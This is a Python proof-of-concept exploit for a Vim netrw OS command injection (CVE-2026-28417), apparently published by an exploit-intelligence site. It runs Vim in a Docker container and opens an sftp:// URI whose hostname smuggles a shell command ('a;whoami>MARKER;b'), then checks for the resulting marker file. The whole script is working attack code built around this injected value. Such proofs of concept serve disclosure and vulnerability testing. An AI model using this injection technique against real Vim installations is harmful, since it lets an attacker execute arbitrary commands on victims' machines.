#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Vim netrw OS Command Injection — SFTP Protocol
# CVE            : CVE-2026-28417
# Vendor         : vim
# Product        : Vim
# Affected       : < v9.2.0073 (netrw plugin)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 4.4 (Medium)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Vim netrw OS Command Injection — SFTP Protocol Injection PoC

Demonstrates the SAME vulnerability but using sftp:// protocol instead
of scp://. This proves the injection is protocol-independent — all
netrw remote protocols that go through MakeSshCmd() are vulnerable.

Payload: sftp://a;whoami>MARKER;b/dir/

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28417
  - https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1
"""

import subprocess
import sys
import uuid

DEFAULT_CONTAINER = "cve-2026-28417-vulnerable"
MARKER = f"CVE-2026-28417-sftp-{uuid.uuid4().hex[:8]}"
WORKDIR = "/workspace"


def docker_exec(container: str, cmd: str, timeout: int = 30) -> tuple[int, str, str]:
    full_cmd = ["docker", "exec", container, "bash", "-c", cmd]
    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def check_container(container: str) -> bool:
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and "true" in result.stdout.strip()


def exploit_sftp_injection(container: str, marker: str) -> bool:
    """
    SFTP protocol command injection.

    Payload: sftp://a;whoami>MARKER;b/dir/

    netrw processes sftp:// URIs through the same code path as scp://.
    The hostname 'a;whoami>MARKER;b' passes validation and gets
    substituted unescaped into an SSH command for SFTP listing.
    """
    print(f"[*] Payload: sftp://a;whoami>{marker};b/dir/")
    print()

    # Clean up
    docker_exec(container, f"rm -f {WORKDIR}/{marker}")

    vim_cmd = (
        f"cd {WORKDIR} && "
        f"timeout 20 vim --clean "
        f"-c 'packadd netrw' "
        f"-c 'e sftp://a;whoami>{marker};b/dir/' "
        f"-c 'qa!' "
        f"</dev/null >/dev/null 2>&1 || true"
    )
    print("[*] Executing Vim with sftp:// injection payload...")
    docker_exec(container, vim_cmd, timeout=30)

    # Check marker
    rc, stdout, _ = docker_exec(container, f"cat {WORKDIR}/{marker} 2>/dev/null")
    if rc == 0 and stdout.strip():
        print(f"[+] VULNERABLE! Marker file created with contents:")
        print(f"    {stdout.strip()}")
        return True
    else:
        print(f"[-] Marker file not found — sftp vector may have failed")
        return False


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print("=" * 70)
    print(f"  CVE-2026-28417 — Vector 3: SFTP Protocol Injection")
    print("=" * 70)
    print()
    print(f"  Target: {container}")
    print(f"  Marker: {MARKER}")
    print()

    if not check_container(container):
        print(f"[-] FATAL: Container '{container}' is not running.")
        sys.exit(1)
    print(f"[+] Container is running.")
    print()

    print("[*] Executing sftp:// protocol injection...")
    print("-" * 50)
    success = exploit_sftp_injection(container, MARKER)
    print("-" * 50)
    print()

    if success:
        print("[+] RESULT: VULNERABLE — sftp:// protocol injection confirmed")
        print("[+] This proves the vulnerability is protocol-independent.")
    else:
        print("[-] RESULT: sftp vector did not succeed")

    # Cleanup
    docker_exec(container, f"rm -f {WORKDIR}/{MARKER}")
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
